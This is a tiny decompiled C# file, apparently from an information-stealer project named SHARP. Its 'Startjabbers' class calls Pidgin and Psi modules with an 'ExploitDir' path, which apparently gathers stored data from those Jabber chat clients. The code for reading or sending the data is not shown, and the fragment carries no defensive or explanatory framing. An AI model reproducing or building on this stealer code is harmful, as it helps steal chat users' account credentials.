﻿using System;

namespace SHARP
{
	// Token: 0x0200005E RID: 94
	internal class Startjabbers
	{
		// Token: 0x06000212 RID: 530 RVA: 0x0000CD1C File Offset: 0x0000AF1C
		public static void Start()
		{
			string exploitDir = Help.ExploitDir;
			Pidgin.Start(exploitDir);
			Psi.Start(exploitDir);
		}
	}
}
